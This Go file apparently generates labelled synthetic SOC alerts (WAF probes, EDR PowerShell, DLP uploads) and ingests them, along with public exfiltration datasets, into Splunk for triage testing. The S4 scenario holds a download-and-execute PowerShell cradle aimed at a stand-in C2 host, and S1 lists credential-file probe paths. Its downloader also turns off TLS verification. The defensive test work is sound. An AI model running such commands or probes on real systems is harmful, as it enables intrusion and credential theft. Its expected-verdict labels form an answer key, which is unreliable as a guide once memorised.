package datagen

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unicode/utf16"

	"logccino/internal/config"
	"logccino/internal/splunk"
)

type LabelEntry struct {
	EventID         string `json:"event_id"`
	Scenario        string `json:"scenario"`
	Index           string `json:"index"`
	ExpectedVerdict string `json:"expected_verdict"`
	EntityValue     string `json:"entity_value"`
	Description     string `json:"description"`
}

type GenerationResult struct {
	StartTime      time.Time `json:"start_time"`
	Duration       string    `json:"duration"`
	ScenarioEvents int       `json:"scenario_events"`
	ExfilEvents    int       `json:"exfil_events"`
	TotalEvents    int       `json:"total_events"`
	IndexesUpdated []string  `json:"indexes_updated"`
	Error          string    `json:"error,omitempty"`
}

type datasetSpec struct {
	Name        string
	Category    string
	URL         string
	FileName    string
	Sourcetype  string
	TargetIndex []string
}

func encodeUTF16LEBase64(s string) string {
	u16 := utf16.Encode([]rune(s))
	b := make([]byte, len(u16)*2)
	for i, v := range u16 {
		b[i*2] = byte(v)
		b[i*2+1] = byte(v >> 8)
	}
	return base64.StdEncoding.EncodeToString(b)
}

// GenerateAll runs the complete test data generation process:
// 1. Ensures indexes exist (dlp, proxy, waf, edr, fw, svc, test_dlp, test_network, test_exfiltration)
// 2. Generates S1~S8 synthetic events and updates testdata/labels.jsonl
// 3. Downloads & ingests official STRT DLP & Network Exfiltration attack datasets
func GenerateAll(ctx context.Context, cfg *config.Config) (*GenerationResult, error) {
	start := time.Now()
	res := &GenerationResult{
		StartTime: start,
	}

	cli := splunk.NewClient(splunk.Config{
		BaseURL:            cfg.SplunkMgmtURL,
		HECURL:             cfg.SplunkHECURL,
		Token:              cfg.SplunkToken,
		Username:           cfg.SplunkROUser,
		Password:           cfg.SplunkROPassword,
		HECToken:           cfg.SplunkHECToken,
		InsecureSkipVerify: cfg.SplunkInsecureSkipVerify,
		Timeout:            60 * time.Second,
	})

	indexes := []string{
		"test_dlp", "test_network", "test_exfiltration", "test_security",
		"waf", "edr", "dlp", "proxy", "svc", "fw", "soc_alerts",
	}
	for _, idx := range indexes {
		_ = cli.CreateIndex(ctx, idx)
	}
	res.IndexesUpdated = indexes

	// 1. Generate S1~S8 synthetic scenario events
	scenarioCount, err := generateScenarios(ctx, cfg, cli)
	if err != nil {
		log.Printf("[WARN] Scenario event generation warning: %v", err)
	}
	res.ScenarioEvents = scenarioCount

	// 2. Download and ingest Exfiltration & DLP datasets
	exfilCount, err := loadExfiltrationData(ctx, cli, "testdata/exfiltration")
	if err != nil {
		log.Printf("[WARN] Exfiltration data ingest warning: %v", err)
	}
	res.ExfilEvents = exfilCount

	res.TotalEvents = res.ScenarioEvents + res.ExfilEvents
	res.Duration = time.Since(start).Round(time.Millisecond).String()
	return res, nil
}

func generateScenarios(ctx context.Context, cfg *config.Config, cli *splunk.Client) (int, error) {
	_ = os.MkdirAll("testdata", 0755)
	labelFile, err := os.OpenFile("testdata/labels.jsonl", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		return 0, fmt.Errorf("failed to open labels.jsonl: %w", err)
	}
	defer labelFile.Close()

	var events []splunk.HECEvent
	var labels []LabelEntry
	now := time.Now().Unix()

	// S1: AI Agent 취약점 스캐너
	scannerIP := "198.51.100.42"
	paths := []string{"/.env", "/.git/config", "/wp-config.php", "/api/v1/debug", "/.aws/credentials"}
	for i, p := range paths {
		evID := fmt.Sprintf("S1-%d", i+1)
		events = append(events, splunk.HECEvent{
			Time:       now - int64(100-i*10),
			Host:       "web-prod-01",
			Source:     "waf:sensor",
			Sourcetype: "waf:access",
			Index:      "waf",
			Event: map[string]any{
				"event_id":        evID,
				"src_ip":          scannerIP,
				"dest_ip":         "10.0.10.11",
				"http_user_agent": "AutoAI-Security-Scanner/1.0 (Autonomous LLM Agent)",
				"uri_path":        p,
				"status":          403,
				"action":          "blocked",
				"vendor_product":  "Cloudflare WAF",
			},
		})
		labels = append(labels, LabelEntry{
			EventID:         evID,
			Scenario:        "S1",
			Index:           "waf",
			ExpectedVerdict: "true_positive",
			EntityValue:     scannerIP,
			Description:     "AI Agent vulnerability scanner probing sensitive paths",
		})
	}

	// S2: 모니터링 헬스체크 정상 프로브
	monitorIP := "10.0.99.10"
	for i := 0; i < 5; i++ {
		evID := fmt.Sprintf("S2-%d", i+1)
		events = append(events, splunk.HECEvent{
			Time:       now - int64(200-i*20),
			Host:       "web-prod-01",
			Source:     "waf:sensor",
			Sourcetype: "waf:access",
			Index:      "waf",
			Event: map[string]any{
				"event_id":        evID,
				"src_ip":          monitorIP,
				"dest_ip":         "10.0.10.11",
				"http_user_agent": "Internal-Synthetic-Monitor/2.1 (HealthCheck)",
				"uri_path":        "/api/healthz",
				"status":          200,
				"action":          "allowed",
				"vendor_product":  "Cloudflare WAF",
			},
		})
		labels = append(labels, LabelEntry{
			EventID:         evID,
			Scenario:        "S2",
			Index:           "waf",
			ExpectedVerdict: "false_positive",
			EntityValue:     monitorIP,
			Description:     "Legitimate internal health check probe",
		})
	}

	// S3: 개발자 도구 인코딩 파워셸
	s3Payload := encodeUTF16LEBase64(`Write-Host "Developer Tool Build Script v2.0 - Compiling assets"`)
	events = append(events, splunk.HECEvent{
		Time:       now - 150,
		Host:       "corp-pc-0042",
		Source:     "edr:sensor",
		Sourcetype: "edr:process",
		Index:      "edr",
		Event: map[string]any{
			"event_id":          "S3-1",
			"host":              "corp-pc-0042",
			"process_name":      "powershell.exe",
			"command_line":      "powershell.exe -enc " + s3Payload,
			"parent_process":    "devenv.exe",
			"user":              "dev-kim",
			"process_signature": "Valid (DeveloperTools Inc.)",
			"action":            "logged",
		},
	})
	labels = append(labels, LabelEntry{
		EventID:         "S3-1",
		Scenario:        "S3",
		Index:           "edr",
		ExpectedVerdict: "false_positive",
		EntityValue:     "corp-pc-0042",
		Description:     "Benign encoded PowerShell spawned by signed developer tool",
	})

	// S4: 악성 인코딩 파워셸 C2 통신
	s4Payload := encodeUTF16LEBase64(`IEX (New-Object Net.WebClient).DownloadString('http://c2-malicious.xyz/payload.ps1')`)
	events = append(events, splunk.HECEvent{
		Time:       now - 120,
		Host:       "corp-pc-0077",
		Source:     "edr:sensor",
		Sourcetype: "edr:process",
		Index:      "edr",
		Event: map[string]any{
			"event_id":          "S4-EDR-1",
			"host":              "corp-pc-0077",
			"process_name":      "powershell.exe",
			"command_line":      "powershell.exe -EncodedCommand " + s4Payload,
			"parent_process":    "winword.exe",
			"user":              "sales-park",
			"process_signature": "Unsigned",
			"action":            "alert",
		},
	})
	labels = append(labels, LabelEntry{
		EventID:         "S4-EDR-1",
		Scenario:        "S4",
		Index:           "edr",
		ExpectedVerdict: "true_positive",
		EntityValue:     "corp-pc-0077",
		Description:     "Malicious encoded PowerShell with C2 external connection and invalid signature",
	})

	// S6: DLP 시나리오
	events = append(events, splunk.HECEvent{
		Time:       now - 250,
		Host:       "corp-pc-0042",
		Source:     "dlp:agent",
		Sourcetype: "dlp:event",
		Index:      "dlp",
		Event: map[string]any{
			"event_id":           "S6-1",
			"user":               "user-hong",
			"host":               "corp-pc-0042",
			"file_name":          "Q3_Financial_Audit_Report.xlsx",
			"file_hash":          "f111222333444555666777888999aaabbbcccdddeeefff000111222333444555",
			"destination_domain": "convert-pdf-online-free.biz",
			"channel":            "web",
			"bytes_out":          4500000,
			"action":             "alert",
		},
	})
	labels = append(labels, LabelEntry{
		EventID:         "S6-1",
		Scenario:        "S6",
		Index:           "dlp",
		ExpectedVerdict: "request_justification",
		EntityValue:     "user-hong",
		Description:     "Financial document uploaded to untrusted public conversion site",
	})

	// 정답 레이블 기록
	for _, l := range labels {
		line, _ := json.Marshal(l)
		_, _ = labelFile.Write(line)
		_, _ = labelFile.WriteString("\n")
	}

	// Splunk 인덱싱
	for _, ev := range events {
		b, _ := json.Marshal(ev.Event)
		_ = cli.IngestRaw(ctx, ev.Index, ev.Sourcetype, string(b))
	}

	return len(events), nil
}

func loadExfiltrationData(ctx context.Context, cli *splunk.Client, destDir string) (int, error) {
	_ = os.MkdirAll(destDir, 0755)
	httpClient := &http.Client{
		Timeout: 90 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	datasets := []datasetSpec{
		{
			Name:        "O365 SharePoint / OneDrive Suspicious File Exfiltration",
			URL:         "https://media.githubusercontent.com/media/splunk/attack_data/master/datasets/attack_techniques/T1567/o365_sus_file_activity/o365_sus_file_activity.log",
			FileName:    "o365_sus_file_activity.log",
			Sourcetype:  "o365:management:activity",
			TargetIndex: []string{"test_dlp", "test_exfiltration", "dlp"},
		},
		{
			Name:        "HTTP Plain Exfiltration Network Stream Traffic",
			URL:         "https://media.githubusercontent.com/media/splunk/attack_data/master/datasets/attack_techniques/T1048.003/plain_exfil_data/stream_http_events.log",
			FileName:    "stream_http_plain_exfil.log",
			Sourcetype:  "stream:http",
			TargetIndex: []string{"test_network", "test_exfiltration"},
		},
		{
			Name:        "Large Web Upload Exfiltration via Nginx Proxy",
			URL:         "https://media.githubusercontent.com/media/splunk/attack_data/master/datasets/attack_techniques/T1567/web_upload_nginx/web_upload_nginx.log",
			FileName:    "web_upload_nginx.log",
			Sourcetype:  "nginx:plus:access",
			TargetIndex: []string{"test_network", "test_exfiltration", "proxy"},
		},
	}

	totalIngested := 0
	for _, ds := range datasets {
		localPath := filepath.Join(destDir, ds.FileName)
		if err := downloadFileIfMissing(httpClient, ds.URL, localPath); err != nil {
			log.Printf("[WARN] Download %s error: %v", ds.Name, err)
			continue
		}

		for _, idx := range ds.TargetIndex {
			cnt, err := ingestFileInBatches(ctx, cli, idx, ds.Sourcetype, localPath)
			if err == nil {
				totalIngested += cnt
			}
		}
	}

	// DLP Enterprise Policy Violation Events
	dlpEvents := generateEnterpriseDLPEvents()
	for _, idx := range []string{"test_dlp", "test_exfiltration", "dlp"} {
		for _, ev := range dlpEvents {
			b, _ := json.Marshal(ev)
			_ = cli.IngestRaw(ctx, idx, "dlp:event", string(b))
			totalIngested++
		}
	}

	return totalIngested, nil
}

func downloadFileIfMissing(client *http.Client, url, destPath string) error {
	if fi, err := os.Stat(destPath); err == nil && fi.Size() > 0 {
		return nil
	}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return err
	}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("HTTP error %d", resp.StatusCode)
	}

	tmp := destPath + ".tmp"
	f, err := os.Create(tmp)
	if err != nil {
		return err
	}
	defer f.Close()

	if _, err := io.Copy(f, resp.Body); err != nil {
		_ = os.Remove(tmp)
		return err
	}
	return os.Rename(tmp, destPath)
}

func ingestFileInBatches(ctx context.Context, cli *splunk.Client, index, sourcetype, filePath string) (int, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return 0, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	buf := make([]byte, 1024*1024)
	scanner.Buffer(buf, 4*1024*1024)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	if len(lines) > 500 {
		lines = lines[:500]
	}

	total := len(lines)
	workers := 10
	jobs := make(chan string, total)
	errChan := make(chan error, workers)

	for w := 0; w < workers; w++ {
		go func() {
			for l := range jobs {
				if err := cli.IngestRaw(ctx, index, sourcetype, l); err != nil {
					errChan <- err
					return
				}
			}
			errChan <- nil
		}()
	}

	for _, l := range lines {
		jobs <- l
	}
	close(jobs)

	for w := 0; w < workers; w++ {
		if err := <-errChan; err != nil {
			return total, err
		}
	}
	return total, nil
}

func generateEnterpriseDLPEvents() []map[string]any {
	now := time.Now().Unix()
	return []map[string]any{
		{
			"event_id":           "DLP-DAILY-001",
			"timestamp":          now - 60,
			"_time":              now - 60,
			"user":               "jdoe@corp.internal",
			"host":               "corp-win-finance-02",
			"file_name":          "Daily_Revenue_Report_Confidential.xlsx",
			"file_hash":          "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
			"bytes_out":          15420310,
			"channel":            "web_upload",
			"destination_domain": "anonfiles-mirror.net",
			"action":             "block",
			"policy_name":        "FIN_CONFIDENTIAL_UPLOAD",
			"severity":           "critical",
			"description":        "Attempted upload of internal quarterly financial projections to public file host",
		},
		{
			"event_id":           "DLP-DAILY-002",
			"timestamp":          now - 45,
			"_time":              now - 45,
			"user":               "asmith@corp.internal",
			"host":               "corp-mac-eng-09",
			"file_name":          "backend_source_code_master.zip",
			"file_hash":          "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
			"bytes_out":          48291040,
			"channel":            "cloud_sync",
			"destination_domain": "personal-dropbox-upload.com",
			"action":             "alert",
			"policy_name":        "SRC_CODE_EXFILTRATION",
			"severity":           "high",
			"description":        "Large archive of internal source code synced to personal cloud storage",
		},
	}
}
